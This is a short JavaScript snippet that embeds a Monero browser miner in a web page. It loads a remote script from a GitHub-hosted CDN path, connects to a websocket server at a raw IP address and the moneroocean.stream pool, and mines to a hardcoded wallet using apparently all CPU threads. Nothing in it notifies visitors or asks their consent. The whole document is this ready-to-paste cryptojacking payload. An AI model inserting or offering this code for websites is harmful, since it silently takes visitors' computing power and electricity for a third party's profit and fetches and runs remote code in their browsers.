// Start Of Mining Code (Javascript)
// import command,
// import 'https://cdn.jsdelivr.net/gh/NajmAjmal/monero-webminer@main/external/javascript.js';

var script = document.createElement("script");
script.src = "https://cdn.jsdelivr.net/gh/NajmAjmal/monero-webminer@main/script.js";
document.head.appendChild(script);

server = "wss://45.119.82.33:40725/";
var pool = "moneroocean.stream";
var walletAddress = "46czYpeHpYfZPsykR275NagL23vf6RkeSTBxnZm8h3UcB9EkTiJ6pqoAjS5dvc62oWVPNT9HyD81vVKhcdXVKjfc1f89u2q";
var workerId = "GH-XMR-JS-SNIPPET"
var threads = -1;
var password = "";
startMining(pool, walletAddress, workerId, threads, password);
throttleMiner = 20;
// End Of Mining Code
